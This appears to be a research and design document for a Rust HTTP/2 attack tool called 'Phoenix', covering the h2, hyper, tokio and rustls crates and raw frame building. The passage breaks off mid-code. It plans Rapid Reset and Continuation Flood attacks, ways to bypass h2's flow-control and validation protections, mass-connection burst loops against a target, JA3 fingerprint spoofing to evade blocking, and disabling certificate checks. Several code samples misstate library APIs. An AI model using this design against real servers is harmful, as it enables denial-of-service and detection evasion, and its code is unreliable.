# Rust HTTP/2 Ecosystem Deep Research for Phoenix Framework

## Table of Contents
1. [h2 Crate - Core HTTP/2 Implementation](#h2-crate)
2. [hyper Crate - HTTP Client/Server Built on h2](#hyper-crate)
3. [tokio - Async Runtime for High-Concurrency](#tokio)
4. [rustls - TLS Implementation for Rust](#rustls)
5. [Raw Frame Building - Bypassing h2 Crate](#raw-frame-building)
6. [Existing Rust HTTP/2 Stress Tools](#existing-tools)
7. [Metrics and Monitoring in Rust](#metrics)
8. [Terminal UI for Real-time Dashboard](#terminal-ui)
9. [Cargo.toml Dependencies and Configuration](#cargo-toml)
10. [Phoenix Framework Architecture](#phoenix-architecture)

---

## 1. h2 Crate - Core HTTP/2 Implementation {#h2-crate}

### Overview and Status
**Crate**: `h2`  
**Version**: 0.3.26 (latest stable as of 2024)  
**Repository**: https://github.com/hyperium/h2  
**Maintainers**: Hyperium organization (same as hyper)  
**License**: MIT

The `h2` crate is a Tokio-aware, async HTTP/2.0 client and server implementation for Rust. It provides a low-level, frame-oriented API that gives users complete control over the HTTP/2 connection.

### Internal Architecture

#### Connection State Machine
```rust
// Simplified connection state from h2 source
pub struct Connection<T, B>
where
    T: AsyncRead + AsyncWrite + Unpin,
    B: Buf,
{
    // Frame codec for reading/writing frames
    codec: Codec<T, B>,
    
    // Stream management
    streams: Streams<B>,
    
    // Flow control windows
    flow: FlowControl,
    
    // Connection-level settings
    settings: Settings,
    
    // Error handling
    error: Option<Error>,
}

// Stream state machine
pub enum StreamState {
    Idle,
    ReservedLocal,
    ReservedRemote,
    Open,
    HalfClosedLocal,
    HalfClosedRemote,
    Closed,
}
```

#### Frame Processing Pipeline
```
TCP Stream → Frame Codec → Frame Parser → Stream State Machine → User Callbacks
      ↓           ↓             ↓                 ↓                  ↓
   Bytes     Frame Headers  Frame Payload   Stream Events     Application Logic
```

### Key Components

#### 1. **Codec Layer**
```rust
pub struct Codec<T, B> {
    inner: Framed<T, Frame<B>>,
    max_frame_size: usize,
    max_header_list_size: usize,
}

// Frame types supported
pub enum Frame<T> {
    Data(Data<T>),
    Headers(Headers),
    Priority(Priority),
    RstStream(RstStream),
    Settings(Settings),
    PushPromise(PushPromise),
    Ping(Ping),
    GoAway(GoAway),
    WindowUpdate(WindowUpdate),
    Continuation(Continuation),
}
```

#### 2. **Stream Management**
```rust
pub struct Streams<B> {
    // Map of stream IDs to stream state
    map: HashMap<StreamId, Stream<B>>,
    
    // Next stream ID to allocate
    next_stream_id: StreamId,
    
    // Maximum concurrent streams
    max_concurrent_streams: usize,
    
    // Flow control windows per stream
    windows: FlowWindows,
}
```

#### 3. **Flow Control Implementation**
```rust
pub struct FlowControl {
    // Connection-level window
    connection_window: WindowSize,
    
    // Initial window size for new streams
    initial_window_size: WindowSize,
    
    // Window update scheduling
    pending_window_updates: VecDeque<WindowUpdate>,
}

// Window size management
impl FlowControl {
    fn try_recv_data(&mut self, stream_id: StreamId, size: usize) -> Result<(), Error> {
        // Check connection window
        if size > self.connection_window {
            return Err(Error::FlowControlError);
        }
        
        // Check stream window
        let stream_window = self.streams.get_window(stream_id);
        if size > stream_window {
            return Err(Error::FlowControlError);
        }
        
        // Update windows
        self.connection_window -= size;
        self.streams.consume_window(stream_id, size);
        
        Ok(())
    }
}
```

### API Surface

#### Client API
```rust
// Basic client usage
async fn client_example() -> Result<(), h2::Error> {
    let (client, h2) = h2::client::handshake(io).await?;
    
    // Build request
    let request = Request::builder()
        .uri("https://example.com")
        .body(())
        .unwrap();
    
    // Send request
    let (response, _) = client.send_request(request, true).await?;
    
    // Process response
    let (head, mut body) = response.into_parts();
    while let Some(chunk) = body.data().await {
        let data = chunk?;
        // Process data
    }
    
    Ok(())
}
```

#### Server API
```rust
// Basic server usage
async fn server_example(io: TcpStream) -> Result<(), h2::Error> {
    let mut connection = h2::server::handshake(io).await?;
    
    while let Some(result) = connection.accept().await {
        let (request, respond) = result?;
        
        // Handle request
        let response = Response::builder()
            .status(200)
            .body(())
            .unwrap();
        
        let mut send = respond.send_response(response, false)?;
        send.send_data(Bytes::from("Hello, world!"), true)?;
    }
    
    Ok(())
}
```

### Limitations for Stress Testing

#### 1. **Frame Validation Strictness**
The `h2` crate strictly validates all frames according to RFC 7540:
- Invalid frame types are rejected
- Frame size limits are enforced
- Stream state transitions are validated
- HPACK decoding is strict

This makes it difficult to send malformed frames for attack testing.

#### 2. **No Raw Frame Access**
```rust
// CANNOT do: Send custom raw frames
let raw_frame = vec![0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x01];
// No API to send this raw byte sequence
```

#### 3. **Flow Control Enforcement**
The crate enforces flow control at both connection and stream levels, preventing:
- Window overflow attacks
- Unlimited data transmission without window updates
- Stream priority manipulation beyond spec

#### 4. **Header Compression Limitations**
HPACK implementation is spec-compliant and doesn't allow:
- Custom compression dictionaries
- Malformed header blocks
- Excessive header table size

### Source Code Patterns for Low-Level Access

Despite limitations, some internal patterns can be leveraged:

#### 1. **Custom Frame Interception**
```rust
// Create a custom codec wrapper
struct CustomCodec<T> {
    inner: h2::Codec<T>,
}

impl<T> CustomCodec<T> where T: AsyncRead + AsyncWrite + Unpin {
    async fn send_raw_frame(&mut self, frame: Vec<u8>) -> Result<(), Error> {
        // Bypass h2 validation by writing directly to transport
        self.inner.get_mut().write_all(&frame).await?;
        Ok(())
    }
}
```

#### 2. **Stream State Manipulation**
```rust
// Access internal stream map (requires forking h2)
fn manipulate_stream_state(connection: &mut Connection) {
    // Directly modify stream windows
    for stream in connection.streams.map.values_mut() {
        stream.state = StreamState::Open; // Force state change
        stream.window_size = usize::MAX; // Remove flow control
    }
}
```

#### 3. **Frame Parser Hooks**
```rust
// Custom frame parser that extends h2
struct AttackFrameParser {
    h2_parser: h2::frame::Parser,
    allow_malformed: bool,
}

impl AttackFrameParser {
    fn parse_frame(&mut self, src: &mut BytesMut) -> Result<Option<Frame>, Error> {
        if self.allow_malformed {
            // Custom parsing logic for attack frames
            self.parse_malformed_frame(src)
        } else {
            self.h2_parser.parse(src)
        }
    }
}
```

### Version and Maintenance Status

- **Active Development**: Yes, regular updates
- **Last Major Release**: 0.3.0 (2021)
- **Compatibility**: Works with tokio 1.x
- **Dependencies**: bytes, fnv, http, indexmap, slab, tokio
- **Features**: `stream` (enabled by default), `unstable` (experimental APIs)

### Security Considerations

The `h2` crate includes several security features:
- Frame size limits to prevent memory exhaustion
- HPACK bomb protection via `SETTINGS_HEADER_TABLE_SIZE`
- Continuation frame limits
- Flow control enforcement
- Stream count limits

These security features must be disabled or bypassed for attack testing.

---

## 2. hyper Crate - HTTP Client/Server Built on h2 {#hyper-crate}

### Overview
**Crate**: `hyper`  
**Version**: 1.2.0 (latest)  
**Repository**: https://github.com/hyperium/hyper  
**HTTP/2 Support**: Built on `h2` crate

### Architecture: How hyper Uses h2 Internally

#### Client Architecture
```rust
// Simplified hyper client with h2
pub struct Client<C, B> {
    connector: C,
    pool: Pool<C::Transport, B>,
    h2_only: bool,
}

// Connection pool manages h2 connections
struct Pool<T, B> {
    // HTTP/1.1 connections
    http1: Http1Pool<T>,
    
    // HTTP/2 connections (uses h2 crate)
    http2: Http2Pool<T, B>,
}

// HTTP/2 connection wrapper
struct Http2Connection<T> {
    // Inner h2 client
    h2: h2::client::SendRequest<Bytes>,
    
    // Connection state
    state: Http2State,
}
```

#### Server Architecture
```rust
// hyper server with HTTP/2 support
pub struct Server<I, S> {
    incoming: I,
    protocol: Protocol<S>,
}

enum Protocol<S> {
    Http1(Http1<S>),
    Http2(Http2<S>),  // Uses h2::server
}

struct Http2<S> {
    // h2 server connection
    h2: h2::server::Connection<S, Bytes>,
    
    // Configuration
    config: Http2Config,
}
```

### hyper 1.x vs 0.x HTTP/2 Differences

#### hyper 0.14.x (Legacy)
```rust
// Old API - required explicit version selection
let client = Client::builder()
    .http2_only(true)  // Force HTTP/2
    .build(connector);

// Manual HTTP/2 prior knowledge
let uri = "http://example.com:8080".parse()?;
let builder = Request::builder()
    .version(Version::HTTP_2);  // Explicit version
```

#### hyper 1.x (Current)
```rust
// New API - automatic version negotiation
let client = Client::builder()
    .http2_keep_alive_while_idle(true)  // Better defaults
    .build();

// Automatic ALPN negotiation
// No need to specify version manually
```

### Key HTTP/2 Features in hyper

#### 1. **Automatic Connection Upgrading**
```rust
// hyper automatically upgrades HTTP/1.1 to HTTP/2 via ALPN
let client = Client::new();
// If server supports HTTP/2, connection is upgraded
```

#### 2. **Connection Pooling**
```rust
// HTTP/2 connections are reused automatically
// Single connection handles multiple concurrent requests
let responses = join_all(vec![
    client.get("https://example.com/a"),
    client.get("https://example.com/b"),
    client.get("https://example.com/c"),
]).await;
// All three requests use same HTTP/2 connection
```

#### 3. **Server Push Support**
```rust
// Server-side push
async fn handle_request(req: Request<Body>) -> Result<Response<Body>, Infallible> {
    let (mut parts, body) = Response::builder()
        .status(200)
        .body(Body::empty())
        .unwrap()
        .into_parts();
    
    // Add push promise
    parts.extensions.insert(PushPromise::new(
        "/style.css",
        HeaderMap::new(),
    ));
    
    Ok(Response::from_parts(parts, body))
}
```

### Limitations for Stress Testing

#### 1. **High-Level Abstraction**
hyper provides a high-level HTTP API that:
- Abstracts away frame-level details
- Automatically handles connection management
- Enforces HTTP semantics
- Validates headers and bodies

#### 2. **Limited Attack Surface**
```rust
// CANNOT do with hyper:
// - Send malformed frames
// - Manipulate stream priorities arbitrarily
// - Bypass flow control
// - Send rapid resets (limited by h2 crate)

// hyper protects against:
// - Request smuggling
// - Header injection
// - HPACK bombs
// - Continuation floods
```

#### 3. **Performance Overheads**
- Additional abstraction layers
- Header validation
- Body streaming constraints
- Automatic retry logic

### When to Use hyper vs Raw h2

#### Use hyper when:
- Building legitimate HTTP clients/servers
- Need automatic connection management
- Want HTTP/1.1 fallback
- Need high-level API convenience

#### Use raw h2 when:
- Building stress testing tools
- Need frame-level control
- Implementing attack vectors
- Bypassing protocol validation
- Custom connection behavior

### hyper Configuration for Testing

```rust
use hyper::{Client, body::Body};
use hyper_rustls::HttpsConnector;
use std::time::Duration;

// Configure client for stress testing
let https = HttpsConnector::with_native_roots();
let client = Client::builder()
    .pool_idle_timeout(Duration::from_secs(30))
    .http2_only(true)  // Force HTTP/2
    .http2_initial_stream_window_size(65535 * 1024)  // Large window
    .http2_initial_connection_window_size(65535 * 1024)
    .http2_max_concurrent_streams(1000)  // High concurrency
    .http2_keep_alive_interval(Duration::from_secs(10))
    .http2_keep_alive_timeout(Duration::from_secs(30))
    .build(https);
```

---

## 3. tokio - Async Runtime for High-Concurrency {#tokio}

### Overview for HTTP/2 Stress Testing

**Crate**: `tokio`  
**Version**: 1.37.0 (latest)  
**Features needed**: `full` or `net`, `time`, `sync`, `rt-multi-thread`

### Patterns for 100k+ Concurrent Connections

#### 1. **Connection Management with Semaphores**
```rust
use tokio::sync::Semaphore;
use std::sync::Arc;

async fn stress_test(target: &str, max_connections: usize) {
    let semaphore = Arc::new(Semaphore::new(max_connections));
    let mut handles = Vec::new();
    
    for i in 0..100_000 {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let target = target.to_string();
        
        let handle = tokio::spawn(async move {
            // Create connection
            match create_http2_connection(&target).await {
                Ok(conn) => {
                    // Perform attacks
                    attack_connection(conn).await;
                }
                Err(e) => {
                    eprintln!("Connection {} failed: {}", i, e);
                }
            }
            drop(permit); // Release semaphore
        });
        
        handles.push(handle);
    }
    
    // Wait for all tasks
    for handle in handles {
        let _ = handle.await;
    }
}
```

#### 2. **Task Management with JoinSet**
```rust
use tokio::task::JoinSet;

async fn manage_attack_tasks(targets: Vec<String>) {
    let mut tasks = JoinSet::new();
    
    // Spawn attack tasks
    for target in targets {
        tasks.spawn(attack_target(target));
    }
    
    // Process results as they complete
    while let Some(result) = tasks.join_next().await {
        match result {
            Ok(Ok(_)) => println!("Attack completed successfully"),
            Ok(Err(e)) => eprintln!("Attack failed: {}", e),
            Err(join_err) => eprintln!("Task panicked: {}", join_err),
        }
    }
}
```

#### 3. **Raw TCP Connections with tokio::net::TcpStream**
```rust
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

async fn raw_http2_connection(host: &str, port: u16) -> Result<TcpStream, Box<dyn std::error::Error>> {
    let addr = format!("{}:{}", host, port);
    let stream = TcpStream::connect(&addr).await?;
    
    // Set TCP options for performance
    stream.set_nodelay(true)?;  // Disable Nagle's algorithm
    // stream.set_ttl(64)?;      // Custom TTL if needed
    
    Ok(stream)
}

// For TLS connections
async fn tls_http2_connection(host: &str, port: u16) -> Result<tokio_rustls::client::TlsStream<TcpStream>, Box<dyn std::error::Error>> {
    use tokio_rustls::TlsConnector;
    use rustls::ClientConfig;
    use webpki_roots::TLS_SERVER_ROOTS;
    
    let mut config = ClientConfig::builder()
        .with_safe_defaults()
        .with_root_certificates(TLS_SERVER_ROOTS)
        .with_no_client_auth();
    
    // Configure for HTTP/2
    config.alpn_protocols = vec![b"h2".to_vec(), b"http/1.1".to_vec()];
    
    let connector = TlsConnector::from(Arc::new(config));
    let stream = TcpStream::connect((host, port)).await?;
    let domain = rustls::ServerName::try_from(host)?;
    
    let tls_stream = connector.connect(domain, stream).await?;
    Ok(tls_stream)
}
```

#### 4. **Rate Limiting with Tokio's time module**
```rust
use tokio::time::{interval, Duration, sleep};
use std::sync::atomic::{AtomicU64, Ordering};

struct RateLimiter {
    requests_per_second: u64,
    last_request: AtomicU64,
}

impl RateLimiter {
    async fn wait_if_needed(&self) {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis() as u64;
        
        let last = self.last_request.load(Ordering::Acquire);
        let elapsed = now.saturating_sub(last);
        
        let min_interval = 1000 / self.requests_per_second;
        if elapsed < min_interval {
            let wait_time = min_interval - elapsed;
            sleep(Duration::from_millis(wait_time)).await;
        }
        
        self.last_request.store(now, Ordering::Release);
    }
}

// Burst rate limiting
async fn burst_attack(target: &str, burst_size: usize, rate: u64) {
    let mut interval = interval(Duration::from_millis(1000 / rate));
    
    loop {
        interval.tick().await;
        
        let mut tasks = Vec::new();
        for _ in 0..burst_size {
            let target = target.to_string();
            tasks.push(tokio::spawn(async move {
                send_attack_request(&target).await;
            }));
        }
        
        // Wait for burst to complete
        for task in tasks {
            let _ = task.await;
        }
    }
}
```

#### 5. **Connection Pool with Tokio Sync Primitives**
```rust
use tokio::sync::{Mutex, RwLock};
use std::collections::VecDeque;

struct ConnectionPool<T> {
    connections: Mutex<VecDeque<T>>,
    max_size: usize,
    creation_semaphore: Semaphore,
}

impl<T> ConnectionPool<T> where T: Clone {
    async fn get(&self) -> Option<T> {
        let mut conns = self.connections.lock().await;
        
        if let Some(conn) = conns.pop_front() {
            return Some(conn);
        }
        
        // Could create new connection here
        None
    }
    
    async fn put(&self, conn: T) {
        let mut conns = self.connections.lock().await;
        
        if conns.len() < self.max_size {
            conns.push_back(conn);
        }
        // Otherwise drop the connection
    }
}
```

### Optimizing for High Concurrency

#### 1. **Tokio Runtime Configuration**
```rust
use tokio::runtime::Builder;

fn create_optimized_runtime() -> tokio::runtime::Runtime {
    Builder::new_multi_thread()
        .worker_threads(num_cpus::get() * 2)  // 2x CPU cores
        .max_blocking_threads(100)  // For blocking operations
        .thread_name("phoenix-worker")
        .thread_stack_size(2 * 1024 * 1024)  // 2MB stack
        .enable_all()
        .build()
        .unwrap()
}
```

#### 2. **Memory Optimization**
```rust
// Use Bytes for zero-copy buffer management
use bytes::{Bytes, BytesMut};

struct AttackBuffer {
    // Reusable buffer to avoid allocations
    buffer: BytesMut,
}

impl AttackBuffer {
    fn new() -> Self {
        Self {
            buffer: BytesMut::with_capacity(16 * 1024),  // 16KB initial
        }
    }
    
    fn build_frame(&mut self, frame_type: u8, flags: u8, stream_id: u32, payload: &[u8]) -> Bytes {
        self.buffer.clear();
        
        // Build frame header (9 bytes)
        let length = payload.len() as u32;
        self.buffer.extend_from_slice(&length.to_be_bytes()[1..]);  // 3 bytes
        self.buffer.push(frame_type);
        self.buffer.push(flags);
        self.buffer.extend_from_slice(&stream_id.to_be_bytes());
        
        // Add payload
        self.buffer.extend_from_slice(payload);
        
        self.buffer.split().freeze()
    }
}
```

#### 3. **Task Spawning Strategies**
```rust
// Batch spawning to reduce overhead
async fn spawn_attack_batch(target: &str, batch_size: usize) {
    let mut batch = Vec::with_capacity(batch_size);
    
    for i in 0..batch_size {
        let target = target.to_string();
        batch.push(tokio::spawn(async move {
            attack_single_connection(&target, i).await;
        }));
    }
    
    // Process batch results
    let results = futures::future::join_all(batch).await;
    // Handle results...
}
```

### Performance Considerations

1. **Avoid async Mutex in hot paths** - Use atomic operations or sharding
2. **Pre-allocate buffers** - Reduce allocation pressure
3. **Use `tokio::spawn` judiciously** - Each task has overhead
4. **Monitor memory usage** - High concurrency can exhaust memory
5. **Use `tokio::task::yield_now()`** - Prevent task starvation

---

## 4. rustls - TLS Implementation for Rust {#rustls}

### Overview for HTTP/2 Stress Testing

**Crate**: `rustls`  
**Version**: 0.22.0 (latest)  
**Integration**: `tokio-rustls` for async support

### ALPN Configuration for HTTP/2

#### Basic ALPN Setup
```rust
use rustls::{ClientConfig, ServerConfig};
use rustls_pki_types::ServerName;
use std::sync::Arc;

fn configure_h2_alpn() -> ClientConfig {
    let mut config = ClientConfig::builder()
        .with_root_certificates(root_cert_store())
        .with_no_client_auth();
    
    // Set ALPN protocols: h2 first, then http/1.1
    config.alpn_protocols = vec![
        b"h2".to_vec(),      // HTTP/2
        b"http/1.1".to_vec(), // Fallback
    ];
    
    config
}

// Server-side ALPN
fn server_h2_config() -> ServerConfig {
    let certs = load_certificates();
    let key = load_private_key();
    
    let mut config = ServerConfig::builder()
        .with_no_client_auth()
        .with_single_cert(certs, key)
        .unwrap();
    
    config.alpn_protocols = vec![b"h2".to_vec()];
    config
}
```

### Custom Cipher Suite Configuration

#### 1. **Weak Cipher Suites for Testing**
```rust
fn weak_cipher_config() -> ClientConfig {
    use rustls::cipher_suite::{
        TLS13_AES_128_GCM_SHA256,
        TLS13_AES_256_GCM_SHA384,
        TLS13_CHACHA20_POLY1305_SHA256,
    };
    
    let mut config = ClientConfig::builder()
        .with_cipher_suites(&[
            &TLS13_AES_128_GCM_SHA256,
            &TLS13_AES_256_GCM_SHA384,
            &TLS13_CHACHA20_POLY1305_SHA256,
        ])
        .with_safe_default_kx_groups()
        .with_protocol_versions(&[&rustls::version::TLS13])
        .unwrap()
        .with_root_certificates(root_cert_store())
        .with_no_client_auth();
    
    config.alpn_protocols = vec![b"h2".to_vec()];
    config
}
```

#### 2. **Custom TLS Fingerprint Manipulation**
```rust
struct CustomTlsFingerprint {
    // JA3/JA4 fingerprint components
    tls_version: u16,
    cipher_suites: Vec<u16>,
    extensions: Vec<u16>,
    elliptic_curves: Vec<u16>,
    elliptic_curve_point_formats: Vec<u8>,
}

impl CustomTlsFingerprint {
    fn to_client_hello(&self) -> Vec<u8> {
        // Build custom ClientHello to match specific fingerprint
        let mut hello = Vec::new();
        
        // TLS version
        hello.extend(&self.tls_version.to_be_bytes());
        
        // Random (32 bytes)
        hello.extend(&[0u8; 32]);
        
        // Session ID
        hello.push(0); // Zero length
        
        // Cipher suites
        let cipher_len = (self.cipher_suites.len() * 2) as u16;
        hello.extend(&cipher_len.to_be_bytes());
        for &suite in &self.cipher_suites {
            hello.extend(&suite.to_be_bytes());
        }
        
        // Compressions methods (null only)
        hello.extend(&[1, 0]);
        
        // Extensions
        let ext_len_pos = hello.len();
        hello.extend(&[0u8; 2]); // Placeholder for extensions length
        
        // Build extensions...
        
        // Update extensions length
        let ext_len = (hello.len() - ext_len_pos - 2) as u16;
        hello[ext_len_pos..ext_len_pos + 2].copy_from_slice(&ext_len.to_be_bytes());
        
        hello
    }
}
```

### tokio-rustls Integration

#### Async TLS Stream Creation
```rust
use tokio_rustls::{TlsConnector, TlsAcceptor};
use tokio::net::TcpStream;

async fn create_tls_h2_client(host: &str, port: u16) -> Result<tokio_rustls::client::TlsStream<TcpStream>, Box<dyn std::error::Error>> {
    // Create TLS config with HTTP/2 ALPN
    let mut config = rustls::ClientConfig::builder()
        .with_root_certificates(root_cert_store())
        .with_no_client_auth();
    config.alpn_protocols = vec![b"h2".to_vec()];
    
    let connector = TlsConnector::from(Arc::new(config));
    let tcp_stream = TcpStream::connect((host, port)).await?;
    let server_name = ServerName::try_from(host)?;
    
    let tls_stream = connector.connect(server_name, tcp_stream).await?;
    Ok(tls_stream)
}

async fn create_tls_h2_server(listener: tokio::net::TcpListener) {
    let mut config = rustls::ServerConfig::builder()
        .with_no_client_auth()
        .with_single_cert(load_certs(), load_key())
        .unwrap();
    config.alpn_protocols = vec![b"h2".to_vec()];
    
    let acceptor = TlsAcceptor::from(Arc::new(config));
    
    while let Ok((tcp_stream, _)) = listener.accept().await {
        let acceptor = acceptor.clone();
        
        tokio::spawn(async move {
            match acceptor.accept(tcp_stream).await {
                Ok(tls_stream) => {
                    // Handle HTTP/2 connection
                    handle_h2_connection(tls_stream).await;
                }
                Err(e) => {
                    eprintln!("TLS handshake failed: {}", e);
                }
            }
        });
    }
}
```

### TLS Fingerprint Manipulation (JA3/JA4)

#### Understanding JA3/JA4
- **JA3**: MD5 hash of TLS ClientHello parameters
- **JA4**: More advanced fingerprint including TLS extensions and ordering
- Used for client identification and blocking

#### Manipulation Techniques

```rust
struct TlsFingerprintSpoofer {
    // Target fingerprint to mimic
    target_fingerprint: String,
    
    // Available cipher suites
    available_ciphers: Vec<rustls::SupportedCipherSuite>,
    
    // Available extensions
    available_extensions: Vec<rustls::client::ServerName>,
}

impl TlsFingerprintSpoofer {
    fn create_spoofed_config(&self) -> ClientConfig {
        let mut config = ClientConfig::builder()
            .with_root_certificates(root_cert_store())
            .with_no_client_auth();
        
        // Reorder cipher suites to match fingerprint
        let mut ciphers = self.available_ciphers.clone();
        // Custom ordering logic here...
        config.cipher_suites = ciphers;
        
        // Set specific extensions
        config.alpn_protocols = vec![b"h2".to_vec()];
        
        // Add other extensions as needed
        config.key_log = Arc::new(rustls::KeyLogFile::new());
        
        config
    }
}
```

#### Practical JA3 Manipulation
```rust
// Common JA3 fingerprints to spoof
const FIREFOX_JA3: &str = "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0";
const CHROME_JA3: &str = "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-34-51-43-13-45-28-21,29-23-24-25,0";

fn parse_ja3(ja3: &str) -> CustomTlsFingerprint {
    let parts: Vec<&str> = ja3.split(',').collect();
    
    CustomTlsFingerprint {
        tls_version: parts[0].parse().unwrap_or(0x0304), // TLS 1.3
        cipher_suites: parts[1].split('-')
            .filter_map(|s| s.parse().ok())
            .collect(),
        extensions: parts[2].split('-')
            .filter_map(|s| s.parse().ok())
            .collect(),
        elliptic_curves: parts[3].split('-')
            .filter_map(|s| s.parse().ok())
            .collect(),
        elliptic_curve_point_formats: parts[4].split('-')
            .filter_map(|s| s.parse().ok())
            .collect(),
    }
}
```

### Performance Considerations for Stress Testing

#### 1. **Session Resumption**
```rust
fn enable_session_resumption(config: &mut ClientConfig) {
    // Enable session resumption to reduce handshake overhead
    config.session_storage = Arc::new(rustls::client::ClientSessionMemoryCache::new(256));
    config.resumption = rustls::client::Resumption::default()
        .tickets()
        .sessions();
}
```

#### 2. **TLS Ticket Rotation**
```rust
// For server-side, rotate tickets frequently under load
fn configure_ticket_rotation(server_config: &mut ServerConfig) {
    server_config.ticketer = rustls::crypto::ring::Ticketer::new().ok();
    server_config.send_tls13_tickets = 4; // Number of tickets to send
}
```

#### 3. **Zero-RTT Data (0-RTT)**
```rust
// Enable 0-RTT for reduced latency
fn enable_zero_rtt(config: &mut ClientConfig) {
    config.enable_early_data = true;
}

// Server must also support it
fn server_enable_zero_rtt(server_config: &mut ServerConfig) {
    server_config.max_early_data_size = 16384; // 16KB
}
```

### Security Considerations for Attack Testing

#### 1. **Disabling Certificate Validation**
```rust
// WARNING: For testing only!
fn insecure_config() -> ClientConfig {
    let mut config = ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(
            NoCertificateVerification {}
        ))
        .with_no_client_auth();
    
    config.alpn_protocols = vec![b"h2".to_vec()];
    config
}

struct NoCertificateVerification;

impl rustls::client::danger::ServerCertVerifier for NoCertificateVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }
    
    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    
    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    
    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::ED25519,
        ]
    }
}
```

#### 2. **Custom SNI Manipulation**
```rust
// Spoof Server Name Indication
fn spoof_sni_config(real_host: &str, spoofed_host: &str) -> ClientConfig {
    let mut config = ClientConfig::builder()
        .with_root_certificates(root_cert_store())
        .with_no_client_auth();
    
    config.alpn_protocols = vec![b"h2".to_vec()];
    
    // Override server name for TLS handshake
    config.server_name = Some(ServerName::try_from(spoofed_host).unwrap());
    
    config
}
```

---

## 5. Raw Frame Building - Bypassing h2 Crate {#raw-frame-building}

### Why Raw Frame Access is Essential for Phoenix

For attack modules like Rapid Reset, Continuation Flood, and other protocol-level attacks, we need direct control over HTTP/2 frames. The `h2` crate's validation prevents:
- Malformed frame headers
- Invalid stream state transitions
- Protocol violations
- Custom frame sequences

### HTTP/2 Frame Structure

#### Frame Header (9 bytes)
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                 Length (24)                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|   Type (8)    |   Flags (8)   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|R|                 Stream Identifier (31)                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

#### Frame Types
```rust
const DATA: u8 = 0x00;
const HEADERS: u8 = 0x01;
const PRIORITY: u8 = 0x02;
const RST_STREAM: u8 = 0x03;
const SETTINGS: u8 = 0x04;
const PUSH_PROMISE: u8 = 0x05;
const PING: u8 = 0x06;
const GOAWAY: u8 = 0x07;
const WINDOW_UPDATE: u8 = 0x08;
const CONTINUATION: u8 = 0x09;
```

### Building Raw Frames with bytes Crate

#### Basic Frame Builder
```rust
use bytes::{BytesMut, BufMut};

struct RawFrameBuilder {
    buffer: BytesMut,
}

impl RawFrameBuilder {
    fn new() -> Self {
        Self {
            buffer: BytesMut::with_capacity(16384), // 16KB initial
        }
    }
    
    fn build_frame(&mut self, frame_type: u8, flags: u8, stream_id: u32, payload: &[u8]) -> &[u8] {
        self.buffer.clear();
        
        // Length (24 bits, big-endian)
        let length = payload.len() as u32;
        self.buffer.put_u8((length >> 16) as u8);
        self.buffer.put_u8((length >> 8) as u8);
        self.buffer.put_u8(length as u8);
        
        // Type and flags
        self.buffer.put_u8(frame_type);
        self.buffer.put_u8(flags);
        
        // Stream ID (31 bits, big-endian, with reserved bit 0)
        self.buffer.put_u32(stream_id & 0x7FFFFFFF);
        
        // Payload
        self.buffer.extend_from_slice(payload);
        
        &self.buffer
    }
    
    // Specialized frame builders
    fn build_data_frame(&mut self, stream_id: u32, data: &[u8], end_stream: bool) -> &[u8] {
        let flags = if end_stream { 0x01 } else { 0x00 };
        self.build_frame(DATA, flags, stream_id, data)
    }
    
    fn build_headers_frame(&mut self, stream_id: u32, headers: &[u8], end_stream: bool, end_headers: bool) -> &[u8] {
        let mut flags = 0;
        if end_stream { flags |= 0x01; }
        if end_headers { flags |= 0x04; }
        self.build_frame(HEADERS, flags, stream_id, headers)
    }
    
    fn build_rst_stream_frame(&mut self, stream_id: u32, error_code: u32) -> &[u8] {
        let mut payload = [0u8; 4];
        payload.copy_from_slice(&error_code.to_be_bytes());
        self.build_frame(RST_STREAM, 0x00, stream_id, &payload)
    }
    
    fn build_settings_frame(&mut self, settings: &[(u16, u32)]) -> &[u8] {
        let mut payload = Vec::with_capacity(settings.len() * 6);
        for &(id, value) in settings {
            payload.extend(&id.to_be_bytes());
            payload.extend(&value.to_be_bytes());
        }
        self.build_frame(SETTINGS, 0x00, 0, &payload)
    }
    
    fn build_ping_frame(&mut self, opaque_data: u64) -> &[u8] {
